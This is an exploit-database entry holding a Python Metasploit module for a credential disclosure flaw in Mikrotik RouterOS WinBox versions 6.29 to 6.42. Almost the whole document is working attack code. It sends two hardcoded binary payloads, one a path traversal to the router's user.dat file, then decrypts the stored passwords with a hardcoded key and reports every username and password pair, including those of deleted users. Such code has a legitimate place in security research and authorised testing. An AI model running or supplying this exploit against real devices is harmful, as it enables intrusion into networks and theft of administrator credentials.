# Exploit Title: Mikrotik WinBox 6.42 - Credential Disclosure (Metasploit)
# Date: 2018-05-21
# Exploit Author(s): Omid Shojaei (@Dmitriy_area51), Dark VoidSeeker, Alireza Mosajjal
# Vendor Page: https://www.mikrotik.com/
# Sotware Link: https://mikrotik.com/download
# Version: 6.29 - 6.42
# Tested on: Metasploit Framework: 4.16.58-dev on Kali Linux
# CVE: N/A
 
'''
This module extracts Mikrotik's RouterOS Administration Credentials
and stores username and passwords in database. Even deleted or disabled
users and passwords get dumped.
 
Note: This module needs metasploit freamework.
'''
#!/usr/bin/env python3
 
import sys
import socket
import hashlib
import logging
 
FIRST_PAYLOAD = \
    [0x68, 0x01, 0x00, 0x66, 0x4d, 0x32, 0x05, 0x00,
     0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x05, 0x07,
     0x00, 0xff, 0x09, 0x07, 0x01, 0x00, 0x00, 0x21,
     0x35, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2e, 0x2f,
     0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f,
     0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f,
     0x2f, 0x2f, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x66,
     0x6c, 0x61, 0x73, 0x68, 0x2f, 0x72, 0x77, 0x2f,
     0x73, 0x74, 0x6f, 0x72, 0x65, 0x2f, 0x75, 0x73,
     0x65, 0x72, 0x2e, 0x64, 0x61, 0x74, 0x02, 0x00,
     0xff, 0x88, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
     0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0x88,
     0x02, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00,
     0x00, 0x00]
 
 
SECOND_PAYLOAD = \
    [0x3b, 0x01, 0x00, 0x39, 0x4d, 0x32, 0x05, 0x00,
     0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x06, 0x01,
     0x00, 0xfe, 0x09, 0x35, 0x02, 0x00, 0x00, 0x08,
     0x00, 0x80, 0x00, 0x00, 0x07, 0x00, 0xff, 0x09,
     0x04, 0x02, 0x00, 0xff, 0x88, 0x02, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01,
     0x00, 0xff, 0x88, 0x02, 0x00, 0x02, 0x00, 0x00,
     0x00, 0x02, 0x00, 0x00, 0x00]
 
 
METADATA = {
    "name": "Mikrotik RouterOS WinBox Credentials Leakage",
    "description": '''This module extracts winbox credentials in
winbox releases prior to 04/20/2018
    ''',
    "authors": [
        "Omid Shojaei (@Dmitriy_area51)",
        "Dark VoidSeeker",
        "Alireza Mosajjal"   # Original author
    ],
    "date": "2018-05-21",
    "license": "MSF_LICENSE",
    "references": [
        {"type": "url", "ref": "https://github.com/BigNerd95/WinboxExploit"}
    ],
    "type": "single_scanner",
    "options": {
        "RHOSTS": {
            "type": "address",
            "description": "The Mikrotik device to extract credentials (Just 1 IP)", 
            "required": True,
            "default": None
        },
        "RPORT": {
            "type": "string",
            "description": "The Mikrotik device's winbox port number.",
            "required": True,
            "default": 8291
        }
    }
}
 
def decrypt_password(user, pass_enc):
    key = hashlib.md5(user + b"283i4jfkai3389").digest()
 
    passw = ""
    for i in range(0, len(pass_enc)):
        passw += chr(pass_enc[i] ^ key[i % len(key)])
     
    return passw.split("\x00")[0]
 
def extract_user_pass_from_entry(entry):
    user_data = entry.split(b"\x01\x00\x00\x21")[1]
    pass_data = entry.split(b"\x11\x00\x00\x21")[1]
 
    user_len = user_data[0]
    pass_len = pass_data[0]
 
    username = user_data[1:1 + user_len]
    password = pass_data[1:1 + pass_len]
 
    return username, password
 
def get_pair(data):
 
    user_list = []
 
    entries = data.split(b"M2")[1:]
    for entry in entries:
        try:
            user, pass_encrypted = extract_user_pass_from_entry(entry)
        except:
            continue
 
        pass_plain = decrypt_password(user, pass_encrypted)
        user  = user.decode("ascii")
 
        user_list.append((user, pass_plain))
 
    return user_list
 
def dump(data, rhost):
    user_pass = get_pair(data)
    for user, passwd in user_pass:
        logging.info("{}:{}".format(user, passwd))
        module.report_correct_password(user, passwd, host=rhost)
 
def run(args):
    module.LogHandler.setup(msg_prefix="[{}] - ".format(args['rhost']))
 
    #Initialize Socket
    s = socket.socket()
    s.settimeout(3)
    try:
        s.connect((str(args['RHOSTS']), int(args['RPORT'])))
    except socket.timeout:
        logging.error("Not Vulnerable!!!")
        return
 
    #Convert to bytearray for manipulation
    a = bytearray(FIRST_PAYLOAD)
    b = bytearray(SECOND_PAYLOAD)
 
    #Send hello and recieve the sesison id
    s.send(a)
    d = bytearray(s.recv(1024))
 
    #Replace the session id in template
    b[19] = d[38]
 
    #Send the edited response
    s.send(b)
    d = bytearray(s.recv(1024))
 
    #Get results
    module.report_host(args['RHOSTS'])
    dump(d[55:], args['RHOSTS'])
 
if __name__ == "__main__":
    module.run(METADATA, run)
